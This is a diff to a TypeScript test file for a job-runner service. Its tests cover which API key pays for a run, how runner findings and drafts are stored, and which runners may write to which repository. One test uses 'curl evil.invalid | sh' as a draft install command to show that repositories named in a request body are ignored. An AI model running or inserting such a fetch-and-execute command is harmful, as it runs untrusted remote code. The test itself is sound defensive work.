@@ -19,6 +19,8 @@ import type { DaemonIo, DaemonJob } from '../src/daemon.js';
 import type { RunnerConfig } from '../src/runner-main.js';
 import { claimJob, enqueueJob, pairRunner, revokeRunner } from '../src/plane.js';
 import { close, connect, ready } from '../src/store.js';
+import { runnerRoutes } from '../src/runner-api.js';
+import { saveRecipe } from '../src/recipe.js';
 
 const CONFIG = {
   planeUrl: 'https://plane.invalid',
@@ -50,6 +52,9 @@ const fakeIo = (over: Partial<DaemonIo> = {}): DaemonIo & { findings: unknown[] 
     cost: async () => {},
     secrets: async () => null,
     finding: async (of) => void findings.push(of),
+    // `null`: nobody pressed Start on these, so the worker falls back to its own key —
+    // which is what a webhook-era job and the local product both do.
+    modelKey: async () => null,
     ...over,
   } as DaemonIo & { findings: unknown[] };
 };
@@ -200,7 +205,10 @@ describe('a runner takes the kinds it asked for and no others', () => {
       await revokeRunner(client, id, 424244).catch(() => {});
     }
     await client.query('delete from runners where id = any($1)', [made.runners]).catch(() => {});
-    await close(client);
+    // NOT `close(client)`. The pool is shared by every describe in this file, and closing it
+    // here left the ones below with "Cannot use a pool after calling end on the pool" — a
+    // failure that reads as a database problem and is a teardown ordering problem. It is
+    // closed once, at the bottom of the file.
   });
 
   /** An installation of its own, so these jobs cannot be taken by anything else running. */
@@ -287,4 +295,213 @@ describe('a runner takes the kinds it asked for and no others', () => {
     // `run` and re-explore a repository as though somebody had reported a bug in it.
     expect(claimed?.kind).toBe('draft');
   });
+});
+
+/**
+ * Whose key pays for a run.
+ *
+ * `POST /api/runs` has refused a person with no stored key since 10k — 412, "no model key" —
+ * and the plane has answered `/runner/runs/:id/model-key` since then too. **Nothing asked
+ * it.** So the check had no consequence: a person stored a key, was told it would be spent
+ * on their runs, and the worker spent its own `OPENROUTER_API_KEY` instead. The operator's
+ * account paid for strangers' runs, and nothing anywhere said so.
+ */
+describe('a run spends the key of whoever pressed Start', () => {
+  const loopOf = async (billed: { provider: string; key: string } | null) => {
+    let seen: unknown;
+    const io = fakeIo({ modelKey: async () => billed });
+    await engineExecute(CONFIG, undefined, undefined, {
+      clone: async () => {},
+      run: async (request) => {
+        seen = (request as { loop?: unknown }).loop;
+        return { runId: 'r', state: {} } as never;
+      },
+    })(job(), io);
+    return seen as { provider: string; apiKey: string; model: string };
+  };
+
+  it('theirs, when the plane names one', async () => {
+    const loop = await loopOf({ provider: 'anthropic', key: 'sk-ant-theirs' });
+    // `apiKey`, which is what `runAgentLoop` reads. `modelKey()` answers `key`, and a spread
+    // of one onto the other added a field nothing reads and kept spending the operator's
+    // account — passing every other assertion here while doing so.
+    expect(loop.apiKey).toBe('sk-ant-theirs');
+    // The PROVIDER travels with the key. A key for one provider spent through another's
+    // wire format is a run that does nothing and reports it as a finding about the bug —
+    // `default-provider-is-openrouter` is the same trap from the fixture side.
+    expect(loop.provider).toBe('anthropic');
+    // And the rest of this worker's configuration survives: the model and effort are the
+    // operator's choice, not the payer's.
+    expect(loop.model).toBe('m');
+  });
+
+  it("the worker's own, when there is nobody to bill", async () => {
+    // A webhook-era job, and every run on the local product. This is what every run did
+    // before the button existed and it must keep working.
+    const loop = await loopOf(null);
+    expect(loop.apiKey).toBe('k');
+    expect(loop.provider).toBe('openrouter');
+  });
+
+  it('and a plane that will not answer stops the run rather than billing the wrong account', async () => {
+    // Falling back on a transport error is the failure this method exists to fix: it spends
+    // the operator's key silently, which is indistinguishable from working.
+    const io = fakeIo({
+      modelKey: async () => {
+        throw new Error('the plane would not hand over the model key: HTTP 500');
+      },
+    });
+    await expect(
+      engineExecute(CONFIG, undefined, undefined, { clone: async () => {}, run: async () => ({}) as never })(
+        job(),
+        io,
+      ),
+    ).rejects.toThrow(/model key/);
+  });
+});
+
+/**
+ * What comes home from a prove or draft job, and what a bad one costs.
+ *
+ * `POST /runner/runs/:id/finding` is the one route on the runner surface that stores
+ * something which is not an event. Its first version called `parseRecipe` on a draft and
+ * answered 400 when it failed — which made `io.finding` throw, left the job open, and
+ * re-dispatched it up to `MAX_DISPATCHES`: **five drafting sessions against the same
+ * repository, each producing the same unparseable proposal**, for a failure retrying cannot
+ * fix. `draftRecipe` returns `draft: unknown` and documents that `parseRecipe` belongs at
+ * the point a human is shown the result, which is where `Environment.tsx` already runs it.
+ */
+describe('a finding comes home, and a bad draft is not retried five times', () => {
+  const made: { runs: string[]; runners: string[] } = { runs: [], runners: [] };
+  const REPO = 'acme/finding-test';
+  const INSTALLATION = 424245;
+
+  afterAll(async () => {
+    if (!client) return;
+    await client.query('delete from jobs where run_id = any($1)', [made.runs]).catch(() => {});
+    await client.query('delete from recipe_drafts where repo = $1', [REPO]).catch(() => {});
+    await client.query('delete from recipes where repo = $1', [REPO]).catch(() => {});
+    await client.query('delete from runners where id = any($1)', [made.runners]).catch(() => {});
+  });
+
+  /** A claimed draft job, and a way to POST a finding for it as its runner. */
+  const heldJob = async (kind: JobKind) => {
+    const runId = await enqueueJob(client!, {
+      installationId: INSTALLATION,
+      repo: REPO,
+      intake: { kind },
+      kind,
+    });
+    made.runs.push(runId);
+    const { runner, token } = await pairRunner(client!, { installationId: INSTALLATION, name: `finding-${kind}` });
+    made.runners.push(runner.id);
+    // Claimed, because `appendFromRunner` authorizes on the run this runner HOLDS.
+    const claimed = await claimJob(client!, runner, { kinds: [kind] });
+    const routes = runnerRoutes({ client: client!, blobRoot: '/tmp' });
+    const post = (body: unknown) =>
+      routes({
+        method: 'POST',
+        path: `/runner/runs/${runId}/finding`,
+        query: new URLSearchParams(),
+        headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
+        body: async () => JSON.stringify(body),
+        raw: async () => Buffer.from(JSON.stringify(body)),
+      });
+    return { runId, post, claimed };
+  };
+
+  it('a proof lands where the onboarding screen reads it', async () => {
+    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
+    await ready(client);
+    // A RECIPE FIRST, because `saveProof` is an `update` — a proof is a fact ABOUT an
+    // approved recipe, so there is nothing to attach one to without it. That is also true
+    // on the real path: a `prove` job only exists because somebody approved something, and
+    // `onboardingJob` returns early when the recipe has been withdrawn since.
+    await saveRecipe(client, REPO, { install: 'npm ci', services: [], test: 'npm test' });
+    const { post } = await heldJob('prove');
+    const answer = await post({ proof: { state: 'ready', provedAt: 'T', caveats: [], unproved: [] } });
+    expect(answer?.status).toBe(200);
+    const { rows } = await client.query(`select proof->>'state' as state from recipes where repo = $1`, [REPO]);
+    expect(rows[0]?.state).toBe('ready');
+  });
+
+  it('AN UNPARSEABLE DRAFT IS STORED, not rejected — the human is the control', async () => {
+    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
+    // What an untrusted agent actually produces some of the time. `parseRecipe` refuses it;
+    // `Environment.tsx` renders it as a pre-filled box that says an agent wrote it, or falls
+    // back to the skeleton if it cannot even be stringified. Either way a person decides.
+    const { post } = await heldJob('draft');
+    const answer = await post({ draft: { install: 42, services: 'not an array' } });
+    // 200, and this is the assertion that stops the retry loop: a 4xx here makes
+    // `io.finding` throw, and the daemon leaves the job open for re-dispatch.
+    expect(answer?.status).toBe(200);
+    const { rows } = await client.query('select draft from recipe_drafts where repo = $1', [REPO]);
+    expect(rows[0]?.draft).toEqual({ install: 42, services: 'not an array' });
+  });
+
+  it('but a draft that is not an object at all is refused, because no box can be filled from it', async () => {
+    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
+    const { post } = await heldJob('draft');
+    for (const draft of ['a string', 42, [1, 2]]) {
+      const answer = await post({ draft });
+      expect(answer?.status, JSON.stringify(draft)).toBe(400);
+    }
+  });
+
+  it('and a body naming neither is refused rather than silently storing nothing', async () => {
+    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
+    const { post } = await heldJob('prove');
+    expect((await post({}))?.status).toBe(400);
+  });
+
+  it('a repo named in the BODY is ignored — the job decides which repository this is', async () => {
+    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
+    // The route reads `facts.repo` from the job. Honouring a body field instead would let
+    // any paired runner overwrite ANY repository's proof or draft on this plane, which is
+    // somebody else's onboarding — the same reason `/runner/runs/:id/secrets` takes no
+    // `repo` parameter. Asserted by naming a repository that exists and is not this job's.
+    const elsewhere = 'Divy97/test-framework-v2-demo';
+    const before = await client.query('select draft from recipe_drafts where repo = $1', [elsewhere]);
+    const { post } = await heldJob('draft');
+    const answer = await post({ repo: elsewhere, draft: { install: 'curl evil.invalid | sh', services: [] } });
+    expect(answer?.status).toBe(200);
+    // Stored against THIS job's repository...
+    const mine = await client.query('select draft from recipe_drafts where repo = $1', [REPO]);
+    expect((mine.rows[0]?.draft as { install?: string })?.install).toBe('curl evil.invalid | sh');
+    // ...and the one it named is untouched.
+    const after = await client.query('select draft from recipe_drafts where repo = $1', [elsewhere]);
+    expect(after.rows[0]?.draft ?? null).toEqual(before.rows[0]?.draft ?? null);
+  });
+
+  it("a runner that does not hold the run cannot write another repository's draft", async () => {
+    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
+    // The repository comes from the JOB, never the body — a runner that could name one
+    // would be able to overwrite any repository's draft on this plane, which is somebody
+    // else's onboarding.
+    const { runId } = await heldJob('draft');
+    const stranger = await pairRunner(client, { installationId: INSTALLATION, name: 'finding-stranger' });
+    made.runners.push(stranger.runner.id);
+    const routes = runnerRoutes({ client, blobRoot: '/tmp' });
+    const answer = await routes({
+      method: 'POST',
+      path: `/runner/runs/${runId}/finding`,
+      query: new URLSearchParams(),
+      headers: { authorization: `Bearer ${stranger.token}`, 'content-type': 'application/json' },
+      body: async () => JSON.stringify({ draft: { install: 'npm ci', services: [] } }),
+      raw: async () => Buffer.alloc(0),
+    });
+    expect(answer?.status).toBe(403);
+  });
+});
+
+/**
+ * The pool, closed once, after every describe in this file has finished with it.
+ *
+ * A `close` inside one describe's `afterAll` ends it for the rest of the file: vitest runs
+ * file-level hooks after the suites they enclose, but a suite's own `afterAll` runs as soon
+ * as that suite is done. The symptom is "Cannot use a pool after calling end on the pool"
+ * in whichever describe happens to be next, which looks like a database fault.
+ */
+afterAll(async () => {
+  if (client) await close(client);
 });
